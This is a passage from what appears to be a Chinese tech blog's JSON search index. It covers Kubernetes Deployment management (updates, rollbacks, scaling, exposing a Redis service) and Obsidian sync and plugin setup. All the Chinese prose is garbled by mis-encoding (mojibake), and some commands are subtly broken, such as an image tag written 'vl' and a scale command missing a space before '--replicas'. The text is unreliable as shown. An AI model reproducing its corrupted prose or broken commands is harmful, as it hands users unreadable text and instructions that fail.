ä½¿ç”¨labelï¼ˆæ ‡ç­¾ï¼‰æ ‡è®°Podã€‚\n  + specï¼šè¡¨ç¤ºPodè¿è¡Œä¸€ä¸ªåå­—ä¸ºnginxçš„å®¹å™¨ã€‚\n  + imageï¼šè¿è¡Œæ­¤Podä½¿ç”¨çš„é•œåƒã€‚\n  + Portï¼šå®¹å™¨ç”¨äºå‘é€å’Œæ¥æ”¶æµé‡çš„ç«¯å£ã€‚\n\n```bash\nkubectl create -f dp-nginx.yaml\n\n# deployment.apps/nginx-deployment created\n\n\nkubectl get deploy\nNAME \t\t\t\t\t\tDESIRED CURRENT UP-TO-DATE AVAILABLE AGE\nnginx-deployment 3 \t\t\t3 \t\t\t\t3\t\t\t\t\t 1\t\t\t 60s\n```\n\n+ NAMEï¼šé›†ç¾¤ä¸­Deploymentçš„åç§°ã€‚\n+ DESIREDï¼šåº”ç”¨ç¨‹åºå‰¯æœ¬æ•°ã€‚\n+ CURRENTï¼šå½“å‰æ­£åœ¨è¿è¡Œçš„å‰¯æœ¬æ•°ã€‚\n+ UP-TO-DATEï¼šæ˜¾ç¤ºå·²è¾¾åˆ°æœŸæœ›çŠ¶æ€çš„è¢«æ›´æ–°çš„å‰¯æœ¬æ•°ã€‚\n+ AVAILABLEï¼šæ˜¾ç¤ºç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„åº”ç”¨ç¨‹åºå‰¯æœ¬æ•°ï¼Œå½“å‰ä¸º1ï¼Œå› ä¸ºéƒ¨åˆ†Podä»åœ¨åˆ›å»ºè¿‡ç¨‹ä¸­ã€‚\n+ AGEï¼šæ˜¾ç¤ºåº”ç”¨ç¨‹åºè¿è¡Œçš„æ—¶é—´ã€‚\n\n##### 2.  æ›´æ–°\n\né€šè¿‡Deploymentéƒ¨ç½²åº”ç”¨åï¼Œç»å¸¸ä¼šæœ‰Deploymentæ–‡ä»¶çš„é…ç½®æ›´æ”¹æˆ–è€…é•œåƒç‰ˆæœ¬è¿­ä»£çš„éœ€æ±‚ï¼Œæ›´æ”¹é…ç½®åè¯¥Deploymentä¼šåˆ›å»ºæ–°çš„ReplicaSetï¼Œä¹‹åä¼šå¯¹ç®¡ç†çš„Podè¿›è¡Œæ»šåŠ¨å‡çº§ã€‚\n\nå‡å¦‚æ›´æ–°Nginx Podçš„imageä½¿ç”¨nginx:1.9.1ï¼Œå¹¶ä½¿ç”¨--recordè®°å½•å½“å‰æ›´æ”¹çš„å‚æ•°ï¼ŒåæœŸå›æ»šæ—¶å¯ä»¥æŸ¥çœ‹åˆ°å¯¹åº”çš„ä¿¡æ¯ï¼š\n\n```bash\nkubectl set image deployment nginx-deployment nginx=nginx:1.9.1 --record \n\n# deployment.extensions/nginx-deployment image updated\n```\n\næ›´æ–°è¿‡ç¨‹ä¸ºæ–°æ—§äº¤æ›¿æ›´æ–°ï¼Œé¦–å…ˆæ–°å»ºä¸€ä¸ªPodï¼Œå½“PodçŠ¶æ€ä¸ºRunningæ—¶ï¼Œåˆ é™¤ä¸€ä¸ªæ—§çš„Podï¼ŒåŒæ—¶åˆ›å»ºä¸€ä¸ªæ–°çš„Podã€‚å½“è§¦å‘ä¸€ä¸ªæ›´æ–°åï¼Œä¼šæœ‰æ–°çš„ReplicaSetäº§ç”Ÿï¼Œæ—§çš„ReplicaSetä¼šè¢«ä¿å­˜ï¼ŒæŸ¥çœ‹æ­¤æ—¶çš„ReplicaSetï¼Œå¯ä»¥ä»AGEæˆ–READYçœ‹å‡ºæ–°æ—§ReplicaSetã€‚\n\n```bash\nkubectl get rs\n\nNAME DESIRED CURRENT READY AGE\nnginx-deployment-5c689d88bb 0 0 0 34m\nnginx-deployment-6987cdb55b 3 3 3 5m14s\n```\n\n\n\n##### 3. å›æ»š\n\nå½“æ›´æ–°çš„ç‰ˆæœ¬ä¸ç¨³å®šæˆ–é…ç½®ä¸åˆç†æ—¶ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œå›æ»šæ“ä½œï¼Œå‡è®¾æˆ‘ä»¬åˆè¿›è¡Œäº†å‡ æ¬¡æ›´æ–°ï¼ˆæ­¤å¤„ä»¥æ›´æ–°é•œåƒç‰ˆæœ¬è§¦å‘æ›´æ–°ï¼Œæ›´æ”¹é…ç½®æ•ˆæœç±»ä¼¼ï¼‰ï¼š\n\n```bash\nkubectl set image deployment nginx-deployment nginx=dotbalo/canary:vl --record \n\nkubectl set image deployment nginx-deployment nginx=dotbalo/canary:v2 --record\n```\n\n\n\nå¦‚æœåªéœ€è¦å›æ»šåˆ°ä¸Šä¸€ä¸ªç¨³å®šç‰ˆæœ¬ï¼Œä½¿ç”¨kubectl rollout undoå³å¯ï¼Œå¦‚æœè¦å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬ï¼Œä½¿ç”¨--to-revisionå‚æ•°ã€‚\n\n```bash\nkubectl rollout undo deployment/nginx-deployment \n#deployment.apps/nginx-deployment\n\nkubectl rollout undo deployment/nginx-deployment\t--to-revision=2 \n# deployment.extensions/nginx-deployment\n```\n\n##### 4. æ‰©å®¹\n\nå½“å…¬å¸è®¿é—®é‡å˜å¤§ï¼Œæˆ–è€…æœ‰é¢„æœŸå†…çš„æ´»åŠ¨æ—¶ï¼Œ3ä¸ªPodå¯èƒ½å·²æ— æ³•æ”¯æ’‘ä¸šåŠ¡æ—¶ï¼Œå¯ä»¥æå‰å¯¹å…¶è¿›è¡Œæ‰©å±•ã€‚ä½¿ç”¨kubectl scaleåŠ¨æ€è°ƒæ•´Podçš„å‰¯æœ¬æ•°ï¼Œæ¯”å¦‚å¢åŠ Podä¸º5ä¸ªã€‚\n\n```bash\nkubectl scale deployment.v1.apps/nginx-deployment--replicas=5 \n\n#deployment.apps/nginx-deployment scaled\n```\n\n\n\n### 2.3 æœ‰çŠ¶æ€åº”ç”¨ç®¡ç†StatefulSet\n\nStatefulSetä¸»è¦ç”¨äºç®¡ç†æœ‰çŠ¶æ€åº”ç”¨ç¨‹åºçš„å·¥ä½œè´Ÿè½½APIå¯¹è±¡ã€‚æ¯”å¦‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¯ä»¥éƒ¨ç½²ElasticSearché›†ç¾¤ã€MongoDBé›†ç¾¤æˆ–è€…éœ€è¦æŒä¹…åŒ–çš„RabbitMQé›†ç¾¤ã€Redisé›†ç¾¤ã€Kafkaé›†ç¾¤å’ŒZooKeeperé›†ç¾¤ç­‰ã€‚\n\n\n\n### 2.4 å®ˆæŠ¤è¿›ç¨‹é›† Daemonset\n\næœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨æ¯ä¸ªKubernetesèŠ‚ç‚¹æˆ–ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹ä¸Šéƒ½éƒ¨ç½²æŸä¸ªåº”ç”¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨Kubernetesçš„DaemonSetè°ƒåº¦Podã€‚DaemonSetç¡®ä¿å…¨éƒ¨ï¼ˆæˆ–è€…æŸäº›ç¬¦åˆæ¡ä»¶ï¼‰èŠ‚ç‚¹ä¸Šè¿è¡Œä¸€ä¸ªPodå‰¯æœ¬ã€‚å½“æœ‰æ–°èŠ‚ç‚¹åŠ å…¥é›†ç¾¤æ—¶ï¼Œä¹Ÿä¼šä¸ºå®ƒä»¬æ–°å¢ä¸€ä¸ªPodï¼Œå½“èŠ‚ç‚¹ä»é›†ç¾¤ä¸­ç§»é™¤æ—¶ï¼Œè¿™äº›Podä¹Ÿä¼šè¢«å›æ”¶ï¼Œåˆ é™¤DaemonSetå°†ä¼šåˆ é™¤å®ƒåˆ›å»ºçš„æ‰€æœ‰Podã€‚\n\n\n\nä½¿ç”¨DaemonSetçš„ä¸€äº›å…¸å‹ç”¨æ³•ï¼š\n\n+ è¿è¡Œé›†ç¾¤å­˜å‚¨daemonï¼ˆå®ˆæŠ¤è¿›ç¨‹ï¼‰ï¼Œä¾‹å¦‚åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡ŒGlusterdã€Cephç­‰ã€‚\n+ åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œæ—¥å¿—æ”¶é›†daemonï¼Œä¾‹å¦‚Fluentdã€Logstashã€‚\n+ åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œç›‘æ§daemonï¼Œæ¯”å¦‚Prometheus Node Exporterã€Collectdã€Datadogä»£ç†ã€New Relicä»£ç†æˆ–Ganglia gmondã€‚\n\n# 5. éƒ¨ç½²å®è·µ\n\nPod æ˜¯ K8S ä¸­æœ€å°çš„è°ƒåº¦å•å…ƒï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨ K8S ä¸­è¿è¡Œä¸€ä¸ª container ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¿è¡Œä¸€ä¸ª Pod è€Œè¿™ä¸ª Pod ä¸­åªåŒ…å«ä¸€ä¸ª container ã€‚\n\n```bash\nâœ  ~ kubectl run redis --image='redis:alpine' \n\ndeployment.apps/redis created\n```\n\næˆ‘ä»¬ä½¿ç”¨ `kubectl get all` æ¥çœ‹çœ‹åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆã€‚\n\n```bash\nâœ  ~ kubectl get all\n\nNAME                         READY     STATUS    RESTARTS   AGE\npod/redis-7c7545cbcb-2m6rp   1/1       Running   0          30s\n\nNAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE\nservice/kubernetes   ClusterIP   10.96.0.1    <none>        443/TCP   32s\n\nNAME                    DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/redis   1         1         1            1           30s\n\nNAME                               DESIRED   CURRENT   READY     AGE\nreplicaset.apps/redis-7c7545cbcb   1         1         1         30s\n```\n\nå¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰æˆ‘ä»¬åˆšæ‰æ‰§è¡Œ `run` æ“ä½œååˆ›å»ºçš„ `deployment.apps/redis`ï¼Œè¿˜æœ‰ `replicaset.apps/redis-7c7545cbcb`, `service/kubernetes` ä»¥åŠ `pod/redis-7c7545cbcb-f984p`ã€‚è¿™äº›åˆ†åˆ«ä»£è¡¨ä»€ä¹ˆå«ä¹‰ï¼Ÿ\n\n### 5.1 Deployment\n\n`Deployment` æ˜¯ä¸€ç§é«˜çº§åˆ«çš„æŠ½è±¡ï¼Œå…è®¸æˆ‘ä»¬è¿›è¡Œæ‰©å®¹ï¼Œæ»šåŠ¨æ›´æ–°åŠé™çº§ç­‰æ“ä½œã€‚æˆ‘ä»¬ä½¿ç”¨ `kubectl run redis --image='redis:alpine` å‘½ä»¤ä¾¿åˆ›å»ºäº†ä¸€ä¸ªåä¸º `redis` çš„ `Deployment`ï¼Œå¹¶æŒ‡å®šäº†å…¶ä½¿ç”¨çš„é•œåƒä¸º `redis:alpine`ã€‚\n\nåŒæ—¶ K8S ä¼šé»˜è®¤ä¸ºå…¶å¢åŠ ä¸€äº›æ ‡ç­¾ï¼ˆLabelï¼‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹ get çš„è¾“å‡ºæ ¼å¼è¿›è¡ŒæŸ¥çœ‹ã€‚\n\n```bash\nâœ  ~ kubectl get deployment.apps/redis -o wide \nNAME      DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGE       CONTAINERS   IMAGES         SELECTOR\nredis     1         1         1            1           40s       redis        redis:alpine   run=redis\n\n\nâœ  ~ kubectl get deploy redis -o wide          \nNAME      DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGE       CONTAINERS   IMAGES         SELECTOR\nredis     1         1         1            1           40s       redis        redis:alpine   run=redis\n```\n\n\n\n`Deployment` çš„åˆ›å»ºé™¤äº†ä½¿ç”¨æˆ‘ä»¬è¿™é‡Œæåˆ°çš„æ–¹å¼å¤–ï¼Œæ›´æ¨èçš„æ–¹å¼ä¾¿æ˜¯ä½¿ç”¨ `yaml` æ ¼å¼çš„é…ç½®æ–‡ä»¶ã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­ä¸»è¦æ˜¯å£°æ˜ä¸€ç§é¢„æœŸçš„çŠ¶æ€ï¼Œè€Œå…¶ä»–ç»„ä»¶åˆ™è´Ÿè´£ååŒè°ƒåº¦å¹¶æœ€ç»ˆè¾¾æˆè¿™ç§é¢„æœŸçš„çŠ¶æ€ã€‚\n\nDeploymentçš„ä½œç”¨ï¼Œè¿˜æœ‰å°† `Pod` æ‰˜ç®¡ç»™ä¸‹é¢å°†è¦ä»‹ç»çš„ `ReplicaSet`ã€‚\n\n### 5.2 ReplicaSet\n\n`ReplicaSet` æ˜¯ä¸€ç§è¾ƒä½çº§åˆ«çš„ç»“æ„ï¼Œå…è®¸è¿›è¡Œæ‰©å®¹ã€‚`ReplicaSet` å¯ç®€å†™ä¸º `rs`ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š\n\n```bash\nâœ  ~ kubectl get rs -o wide\n\nNAME               DESIRED   CURRENT   READY     AGE       CONTAINERS   IMAGES         SELECTOR                           \nredis-7c7545cbcb   1         1         1         11h       redis        redis:alpine   pod-template-hash=3731017676,run=redis\n```\n\nåœ¨è¾“å‡ºç»“æœä¸­ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œé™¤äº†æˆ‘ä»¬å‰é¢çœ‹åˆ°çš„ `run=redis` æ ‡ç­¾å¤–ï¼Œè¿˜å¤šäº†ä¸€ä¸ª `pod-template-hash=3731017676` æ ‡ç­¾ï¼Œè¿™ä¸ªæ ‡ç­¾æ˜¯ç”± `Deployment controller` è‡ªåŠ¨æ·»åŠ çš„ï¼Œç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢å‡ºç°é‡å¤ï¼Œæ‰€ä»¥å°† `pod-template` è¿›è¡Œ hash ç”¨ä½œå”¯ä¸€æ€§æ ‡è¯†ã€‚\n\n### 5.3 Service\n\n`Service` ç®€å•ç‚¹è¯´å°±æ˜¯ä¸ºäº†èƒ½æœ‰ä¸ªç¨³å®šçš„å…¥å£è®¿é—®æˆ‘ä»¬çš„åº”ç”¨æœåŠ¡æˆ–è€…æ˜¯ä¸€ç»„ `Pod`ã€‚é€šè¿‡ `Service` å¯ä»¥å¾ˆæ–¹ä¾¿çš„å®ç°æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡ã€‚\n\n```bash\nâœ  ~ kubectl get service -o wide\n\nNAME         TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE       SELECTOR\nkubernetes   ClusterIP   10.96.0.1    <none>        443/TCP   16m        <none>\n```\n\n\n\n### 5.4 å°†Serviceæš´éœ²å‡ºæ¥\n\næ¥ä¸‹æ¥æˆ‘ä»¬å°†åˆšæ‰éƒ¨ç½²çš„ Redis æœåŠ¡æš´éœ²å‡ºæ¥ã€‚\n\n```bash\nâœ  ~ kubectl expose deploy/redis --port=6379 --protocol=TCP --target-port=6379 --name=redis-server  \nservice/redis-server exposed\n\nâœ  ~ kubectl get svc -o wide                                                                       \nNAME           TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE       SELECTOR\nkubernetes     ClusterIP   10.96.0.1       <none>        443/TCP    49m       <none>\nredis-server   ClusterIP   10.108.105.63   <none>        6379/TCP   4s        run=redis\n```\n\nç°åœ¨æˆ‘ä»¬çš„ redis æ˜¯ä½¿ç”¨çš„é»˜è®¤ç±»å‹ `ClusterIP`ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ç›´æ¥é€šè¿‡å¤–éƒ¨è¿›è¡Œè®¿é—®ï¼Œæˆ‘ä»¬ä½¿ç”¨ `port-forward` çš„æ–¹å¼è®©å®ƒå¯åœ¨é›†ç¾¤å¤–éƒ¨è®¿é—®ã€‚\n\n```bash\nâœ  ~ kubectl port-forward svc/redis-server 6379:6379\n\nForwarding from 127.0.0.1:6379 -> 6379\nForwarding from [::1]:6379 -> 6379\nHandling connection for 6379\n```\n\nåœ¨å¦ä¸€ä¸ªæœ¬åœ°ç»ˆç«¯å†…å¯é€šè¿‡ redis-cli å·¥å…·è¿›è¡Œè¿æ¥ï¼š\n\n```bash\nâœ  ~ redis-cli -h 127.0.0.1 -p 6379\n\n127.0.0.1:6379> ping\nPONG\n```\n\nå½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ `NodePort` çš„æ–¹å¼å¯¹å¤–æš´éœ²æœåŠ¡ã€‚\n\n```bash\nâœ  ~ kubectl expose deploy/redis --port=6379 --protocol=TCP --target-port=6379 --name=redis-server-nodeport --type=NodePort\nservice/redis-server-nodeport exposed\n\nâœ  ~ kubectl get service/redis-server-nodeport -o wide \nNAME                    TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE       SELECTOR\nredis-server-nodeport   NodePort   10.109.248.204   <none>        6379:31913/TCP   11s       run=redis\n```\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡ä»»æ„ `Node` ä¸Šçš„ 31913 ç«¯å£ä¾¿å¯è¿æ¥æˆ‘ä»¬çš„ redis æœåŠ¡ã€‚\n\n### 5.5 Pod\n\n `Pod` æ˜¯ K8S ä¸­çš„æœ€å°åŒ–éƒ¨ç½²å•å…ƒï¼Œæˆ‘ä»¬çœ‹ä¸‹å½“å‰é›†ç¾¤ä¸­ `Pod` çš„çŠ¶æ€ã€‚\n\n```bash\nâœ  ~ kubectl get pods\n\nNAME                     READY     STATUS    RESTARTS   AGE\nredis-7c7545cbcb-jwcf2   1/1       Running   0          8h\n```\n\næˆ‘ä»¬è¿›è¡Œä¸€æ¬¡ç®€å•çš„æ‰©å®¹æ“ä½œã€‚\n\n```bash\nâœ  ~ kubectl scale deploy/redis --replicas=2\ndeployment.extensions/redis scaled\n\nâœ  ~ kubectl get pods\nNAME                     READY     STATUS    RESTARTS   AGE\nredis-7c7545cbcb-jwcf2   1/1       Running   0          8h\nredis-7c7545cbcb-wzh6w   1/1       Running   0          4s\n```\n\nå¯ä»¥çœ‹åˆ° `Pod` æ•°å·²ç»å¢åŠ ï¼Œå¹¶ä¸”ä¹Ÿå·²ç»æ˜¯ `Running` çš„çŠ¶æ€äº†ã€‚(å½“ç„¶åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ Redis æœåŠ¡çš„æ‰©å®¹å¹¶ä¸æ˜¯ä½¿ç”¨è¿™ç§æ–¹å¼è¿›è¡Œæ‰©å®¹çš„ï¼Œéœ€è¦çœ‹å®é™…çš„éƒ¨ç½²æ–¹å¼ä»¥åŠä¸šåŠ¡çš„ä½¿ç”¨å§¿åŠ¿ã€‚)\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://kubernetes.io/zh/docs/tutorials/hello-minikube/\n+ https://www.bookstack.cn/read/kubernetes-handbook/concepts-index.md\n+ https://www.bilibili.com/video/BV1w4411y7Go\n+ https://learn.lianglianglee.com\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"obsidiançš„åŒæ­¥ç­–ç•¥","url":"%2Fp%2Fde419055.html","content":"\n# 1. iCloud åŒæ­¥\n\n### 1.1 iCloud åŒæ­¥æ ‡è®°\n\n- å…³é—­çš„äº‘å½© ã€ä¸å¯åŒæ­¥ã€‘\n- è™šçº¿äº‘å½©ã€æ­£åœ¨åŒæ­¥ã€‘\n- å®å¿ƒäº‘å½© ã€åŒæ­¥å®Œæˆã€‘\n- äº‘å½©ä¸‹ç®­å¤´ ã€å…¶ä»–ç«¯æœ‰ï¼Œå½“å‰è®¾å¤‡æ²¡æœ‰ã€‘\n\n<!-- more -->\n\n### 1.2 å¡ä½é—®é¢˜è§£å†³\n\n- ä»€ä¹ˆä¹Ÿä¸åšã€‚\n- é‡å¯å¤§æ³•ï¼ŒåŒ…æ‹¬é‡ç½®è¿›ç¨‹ã€é‡å¯ç½‘ç»œã€é‡å¼€ç”µè„‘ã€é‡æ–°ç™»å½• Apple ID ä»¥åŠé‡è£…ç³»ç»Ÿã€‚é‡ç½®è¿›ç¨‹å°±æ˜¯é€šè¿‡Â `killall bird`Â å’ŒÂ `killall cloudd`Â ä¸¤ä¸ªå‘½ä»¤ï¼Œå°† iCloud äº‘ç›˜æœ€ç´§å¯†çš„ä¸¤ä¸ªè¿›ç¨‹ bird å’Œ cloudd è¿›ç¨‹æ‰‹åŠ¨æ€æ­»ã€‚\n- ç¬¬ä¸‰ä¸ªåŠæ³•å°±æ˜¯Â **å¼•å¯¼ç³»ç»Ÿé‡æ–°å»ºç«‹ CloudDocs æ–‡ä»¶å¤¹**ï¼Œè¿™ä¸ªè§£å†³æ–¹æ¡ˆæ¥è‡ªÂ [StackExchange](https://sspai.com/link?target=https%3A%2F%2Fapple.stackexchange.com%2Fquestions%2F313716%2Ficloud-drive-wont-sync-on-mac)ã€‚\n\n```bash\nkillall bird    # ç»“æŸ bird è¿™ä¸€ iCloud æ–‡ä»¶åŒæ­¥çš„æ ¸å¿ƒè¿›ç¨‹\nkillall cloudd    # ç»“æŸ cloudd è¿™ä¸€ iCloud æ–‡ä»¶åŒæ­¥çš„æ ¸å¿ƒè¿›ç¨‹\ncd ~/Library/Application\\ Support    # ç»ˆç«¯è¦å¤„ç†çš„æ–‡ä»¶å¤¹è½¬æ¢åˆ°ç”¨æˆ·èµ„æºåº“\nmv CloudDocs CloudDocsOld   # å°†åŸæœ¬ Application Support æ–‡ä»¶å¤¹ä¸­çš„ CloudDocs æ–‡ä»¶å¤¹é‡æ–°å‘½åæˆä¸º CloudDocsOld\n```\n\n### 1.3 å·¥å…·\n\nä½¿ç”¨Â [Circus](https://sspai.com/link?target=https%3A%2F%2Feclecticlightdotcom.files.wordpress.com%2F2021%2F04%2Fcirrus112.zip)Â è¿™æ¬¾å°å·¥å…·ï¼Œæ¥å¯è§†åŒ– iCloud ä¸­æ–‡ä»¶çš„åŒæ­¥è¿›ç¨‹ã€‚è¿™æ¬¾å·¥å…·å¯ä»¥å¸®åŠ©ä½ æŸ¥çœ‹ä¸Šæ–‡ä¸­æåˆ°çš„ logã€æŸ¥çœ‹å½“å‰ iCloud æ–‡ä»¶çš„çŠ¶æ€ã€ä¸‹è½½å½“å‰ iCloud äº‘ç›˜ä¸­å­˜å‚¨çš„æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯å°†å­˜å‚¨åœ¨æœ¬åœ°çš„ iCloud æ–‡ä»¶æ¸…é™¤ã€‚\n\nç®¡ç† iCloud æ–‡ä»¶ï¼Œä¹Ÿè¿˜å¯ä»¥ä½¿ç”¨Â [Bailiff](https://sspai.com/link?target=https%3A%2F%2Feclecticlightdotcom.files.wordpress.com%2F2020%2F08%2Fbailiff15.zip)Â è¿™æ¬¾å°å·¥å…· â€”â€” å®ƒå¯ä»¥å¸®åŠ©ä½ åœ¨èœå•æ æ§åˆ¶æŸä¸ªæ–‡ä»¶æ˜¯å¦åº”å½“ä¿å­˜åœ¨äº‘ç«¯ï¼Œæˆ–è€…æ˜¯ç•™åœ¨æœ¬åœ°ã€‚\n\nä¸‹è½½åœ°å€ï¼šhttps://eclecticlight.co/downloads/\n\n\n\n# 2. Git æ’ä»¶\n\nhttps://github.com/denolehov/obsidian-git\n\nå®‰è£…æ’ä»¶å¼€ç®±å³ç”¨ã€‚\n\n\n\n# 3. Remote Save æ’ä»¶\n\nhttps://github.com/remotely-save/remotely-save \n\nå¯ä»¥é…ç½®Dropboxä½¿ç”¨ã€‚\n\n\n\n# 4. å…¶ä»–åŒæ­¥æ–¹æ¡ˆ\n\n+ https://forum.obsidian.md/t/mobile-setting-up-ios-git-based-syncing-with-mobile-app-using-working-copy/16499\n+ https://forum.obsidian.md/t/workflow-to-sync-dropbox-files-to-a-local-ios-vault/26466\n+ [Obsidian å…è´¹çš„å®æ—¶åŒæ­¥æœåŠ¡](https://irithys.com/p/obsidian-livesync/)\n\n\n\n# 5. å‚è€ƒæ–‡æ¡£\n\n- https://sspai.com/post/72882\n","tags":["obsidian"],"categories":["ç¬”è®°"]},{"title":"obsidianç¬”è®°çš„ä½¿ç”¨","url":"%2Fp%2F2730ea4.html","content":"\n\nObsidianæ˜¯åŸºäº Markdownæ–‡ä»¶çš„æœ¬åœ°å¼ºå¤§çŸ¥è¯†ç®¡ç†è½¯ä»¶ï¼Œå°±è®©Obsidianä½œä¸ºä½ çš„ç¬¬äºŒå¤§è„‘å§ã€‚\n\n<!-- more -->\n\n# 1. ä¸»é¢˜é…ç½®\n\n### 1.1 ä¸»é¢˜æ¨è\n\n- Minimal [æ¨è]\n- Things\n\n### 1.2 Things è°ƒæ•´è¡Œå®½\n\nè®¾ç½®-> å¤–è§‚ -> CSS ä»£ç ç‰‡æ®µ\n\n<img src=\"obsidian%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/1.jpg\" style=\"zoom:50%;\" />\n\n`width.css`\n\n```\nbody {\n\t/*--file-line-width: 100%;*/\n\t--file-line-width: 1350px;\n}\n```\n\n### 1.3 Minimal è°ƒæ•´è¡Œå®½\n\nMinimal Theme Settings æ’ä»¶ -> Typography -> Maximum line width : 95%\n\n\n\n# 2. ä½¿ç”¨æ’ä»¶\n\n<img src=\"obsidian%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/2.jpg\" alt=\"image-20221207144431613\" style=\"zoom: 33%;\" />\n\n### 2.1 ä½¿ç”¨æ’ä»¶ä»‹ç»\n\n+ Admonition ï¼šmarkdownå¥½çœ‹æ ‡è¯†\n+ ~~Calendarï¼šæ—¥æœŸæ’ä»¶~~\n+ Clear Unused Imagesï¼šæ¸…ç†æœªå¼•ç”¨çš„å›¾ç‰‡\n+ Code Editor Shortcutsï¼šç±»ä¼¼vscodeç¼–è¾‘å¿«æ·é”®è®¾ç½®ï¼Œä¾‹å¦‚ `cmd+d`å¤åˆ¶è¡Œ\n+ Commanderï¼šè°ƒæ•´å‘½ä»¤æ˜¾ç¤ºä½ç½®ã€å¿…å¤‡ã€‘\n+ Custom Attachment Locationï¼šè‡ªå®šä¹‰å›¾ç‰‡ä½ç½®ï¼Œç±»ä¼¼Typoraè®¾ç½®\n+ ~~Dataviewï¼šæŸ¥è¯¢ç»Ÿè®¡ç¥å™¨~~\n+ Easy Typingï¼šè¾“å…¥å¢å¼ºï¼Œç¼–è¾‘æ ¼å¼åŒ–ï¼Œæ‹¬å·è‡ªåŠ¨åŒ¹é…\n+ Editing Toolbarï¼šMarkdown å¿«æ·å·¥å…·æ \n+ Editor Syntax Highlightï¼šä»£ç é«˜äº®ã€å¿…å¤‡ã€‘\n+ Excalidrawï¼š ç”»å›¾ï¼Œå¾ˆå¼ºæ‚å¥½çœ‹ã€‚\n+ Find orphaned files and broken linksï¼šæŸ¥æ‰¾æ²¡æœ‰å¼•ç”¨çš„æ–‡ä»¶å’Œé“¾æ¥\n+ floating tocï¼šæµ®åŠ¨ç›®å½•ï¼Œæ¯”å®˜æ–¹å¥½ç”¨ã€å¿…å¤‡ã€‘\n+ ~~Folder Noteï¼šä¸ºç›®å½•ç”Ÿæˆä¸€ä¸ªindexæ–‡ä»¶ï¼Œçœ‹ä¸‹é¢æ‰€æœ‰çš„æ–‡ä»¶~~\n+ ~~Hover Editorï¼šæµ®åŠ¨å¼¹çª—æ–‡ä»¶ç¼–è¾‘~~\n+ Icon Folderï¼šè®¾ç½®æ–‡ä»¶å¤¹Icon\n+ Linterï¼šæ ¼å¼åŒ–markdownã€å¿…å¤‡ã€‘\n+ Minimal Theme Settingsï¼šMinimalä¸»é¢˜é…ç½®\n+ Obsidian Gitï¼šGitåŒæ­¥ã€å¿…å¤‡ã€‘\n+ Open In New Tab: æ‰“å¼€æ–‡ä»¶ä»¥æ–°æ ‡ç­¾çš„å½¢å¼\n+ QuickAddï¼šå¿«é€ŸåŠ å…¥ã€å¿…å¤‡ã€‘\n+ Remotely Saveï¼šç¬¬ä¸‰æ–¹åŒæ­¥ï¼ˆdropboxï¼‰ã€å¿…å¤‡ã€‘\n+ Style Settingsï¼šå„ç§ä¸»é¢˜è®¾ç½®\n+ Table Generatorï¼šè¡¨æ ¼å¿«é€Ÿç”Ÿæˆ\n+ ~~Tag Wranglerï¼šæ ‡ç­¾ç®¡ç†~~\n+ Tasksï¼šTODOä»»åŠ¡ç®¡ç†ã€å¿…å¤‡ã€‘\n+ Text Generatorï¼šæ–‡æœ¬ç”Ÿæˆï¼Œchatgpt\n+ Weread Pluginï¼šå¾®ä¿¡è¯»ä¹¦æ’ä»¶ã€å¿…å¤‡ã€‘\n\n\n\n### 2.2 æ’ä»¶å¿«æ·é”®\n\n+ Tasks\n  + cmd + ,\n  + cmd + .\n+ QuickAdd\n  + cmd + m\n  \n\n\n\n### 2.3 æ‰‹æœºä¸Šç¦æ’ä»¶\n\nè¿›å…¥.obsidianæ–‡ä»¶å¤¹ï¼Œç„¶åè¿›å…¥æ’ä»¶æ–‡ä»¶å¤¹ï¼Œä½ å¯ä»¥ç‚¹å‡»å…¶ä¸­ä¸€ä¸ªæ’ä»¶ï¼Œè®¿é—®**manifest.json**ï¼Œè¿™æ ·ä¹Ÿæ¯”è¾ƒå®¹æ˜“ã€‚\n\nå½“ä½ ç‚¹å‡»è¯¥æ–‡ä»¶æ—¶ï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªé€‰é¡¹ï¼Œä¸Šé¢å†™ç€ \"isDesktopOnly\": falseã€‚å½“ä½ æŠŠå®ƒæ”¹ä¸º \"true \"æ—¶ï¼Œè¯¥æ’ä»¶å°†åœ¨ç§»åŠ¨ç«¯è¢«ç¦ç”¨ã€‚\n\n\n\n# 3. æ•™ç¨‹\n\n### 3.1 